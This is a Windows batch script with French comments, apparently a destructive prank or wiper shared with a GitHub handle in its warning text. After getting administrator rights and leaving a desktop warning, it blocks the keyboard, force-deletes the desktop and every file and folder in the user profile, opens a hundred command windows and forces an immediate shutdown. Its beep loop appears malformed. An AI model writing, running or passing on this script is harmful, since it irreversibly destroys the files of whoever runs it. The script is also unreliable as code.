@echo off
:: Vérification des droits d'administrateur
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Ce script nécessite les droits d'administrateur.
    echo Demande des droits d'administrateur...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:: Création du fichier texte avec le message
echo CE LOGICIEL A DESACTIVE TOUT CE QUE TON PC POUVAIT AVOIR > "%userprofile%\Desktop\Avertissement.txt"
echo NewLifeIsHereDF sur github >> "%userprofile%\Desktop\Avertissement.txt"
echo TU AS ÉTÉ PRÉVENU, SI CELA N'A PAS ÉTÉ LANCÉ SUR UNE VM, RESET TON PC ! >> "%userprofile%\Desktop\Avertissement.txt"

:: Ouvre le fichier dans le Bloc-notes
start notepad "%userprofile%\Desktop\Avertissement.txt"

:: Boucle pour jouer un son Windows
(for /l %%i in () do (echo ^G)) | cmd

:: Désactivation temporaire du clavier
rundll32 user32.dll,BlockInput 1
timeout /t 10 >nul
rundll32 user32.dll,BlockInput 0

:: Suppression de tout sur le bureau
set desktop=%userprofile%\Desktop
del /f /q "%desktop%\*" >nul 2>&1
rmdir /s /q "%desktop%" >nul 2>&1

:: Suppression de tous les fichiers et dossiers utilisateur
set userfolder=%userprofile%
for /d %%i in ("%userfolder%\*") do (
    rmdir /s /q "%%i" >nul 2>&1
)
for %%i in ("%userfolder%\*") do (
    del /f /q "%%i" >nul 2>&1
)

:: Ouvrir une centaine de fenêtres cmd affichant "DONT OPEN ME"
for /l %%i in (1,1,100) do (
    start cmd /k "echo DONT OPEN ME & pause"
)

:: Message final
shutdown /s /f /t 0
